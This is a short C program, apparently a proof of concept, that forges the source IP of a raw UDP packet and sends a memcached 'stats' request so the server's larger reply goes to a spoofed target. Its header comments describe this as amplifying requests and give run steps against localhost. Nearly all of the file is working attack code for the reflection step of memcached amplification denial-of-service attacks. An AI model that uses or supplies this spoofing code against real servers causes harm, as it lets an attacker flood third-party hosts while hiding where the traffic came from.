/*******************************************************************************
 * File: spoof_memcached_udp_request.c
 * Author: matt cleveland
 * Notes: heavily inspired by
 *   https://www.linuxquestions.org/questions/linux-networking-3/%5Bc%5D-raw-soc\
 *          ket-programming-ip-spoofing-not-working-4175457154/
 *
 * How to run:
 *      step 1: run memcached with logging on (or in foreground mode)
 *      step 2: listen on "source_port" with something like
 *              `sudo nc -ul -p <source_port>`
 *      step 3: ./spoof_memcached_udp_request <dest_address> <dest_port>
 *                        <source_address> <source_port>
 *
 *              So if memcached is running on 127.0.0.1:11211 and you want
 *      to amplify requests to 127.0.0.1:888 you would run:
 *        ./spoof_memcached_udp_request 127.0.0.1 11211 127.0.0.1 8888
 *
 *      step 4: look at memcached logs (from step 1) and target server (from
 *              step 2) to see request and response
 *******************************************************************************/
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <arpa/inet.h>


int main(int argc, char* argv[])
{
  if (argc < 5) {
    printf("Usage: ./spoof_memcached_udp_request <dest_address> <dest_port> <source_address> <source_port>\n");
    return 1;
  }

  const char* dest_addr = argv[1];
  int dest_port = atoi(argv[2]);
  const char* source_addr = argv[3];
  int source_port = atoi(argv[4]);

  struct iphdr ip_header;
  ip_header.ihl = 5;
  ip_header.version = 4;
  ip_header.tos = 0;
  ip_header.tot_len = 0;
  ip_header.id = htons(rand() % 65535);
  ip_header.frag_off = 0;
  ip_header.ttl = 255;
  ip_header.protocol = IPPROTO_UDP;
  ip_header.check = 0;
  ip_header.saddr = inet_addr(source_addr);
  ip_header.daddr = inet_addr(dest_addr);

  struct udphdr udp_header;
  udp_header.source = htons(source_port);
  udp_header.dest = htons(dest_port);
  udp_header.len = htons(8 + 15); /* 15 is size of data */
  udp_header.check = 0;

  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(dest_port);
  sin.sin_addr.s_addr = inet_addr(dest_addr);

  unsigned char data[] = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";

  ip_header.tot_len = htons(sizeof(ip_header) + sizeof(udp_header) + sizeof(data));
  int totalTrameLength = sizeof(ip_header) + sizeof(udp_header) + sizeof(data);

  int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  if (raw_socket < 0) {
    perror("SOCKET CREATION ERROR");
    return EXIT_FAILURE;
  } else {
    printf("SOCKET CREATED\n");
  }

  int enabled = 1;

  unsigned char packet[totalTrameLength];
  printf("packet length: %d\n", totalTrameLength);

  memcpy(packet, &ip_header, sizeof(ip_header));
  memcpy(packet + sizeof(ip_header), &udp_header, sizeof(udp_header));
  memcpy(packet + sizeof(ip_header) + sizeof(udp_header), data, sizeof(data));

  if (sendto(raw_socket, packet, sizeof(packet), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
    perror("PACKET NOT SENT\n");
    return EXIT_FAILURE;
  } else {
    printf("PACKET SENT\n");
  }

  return EXIT_SUCCESS;
}
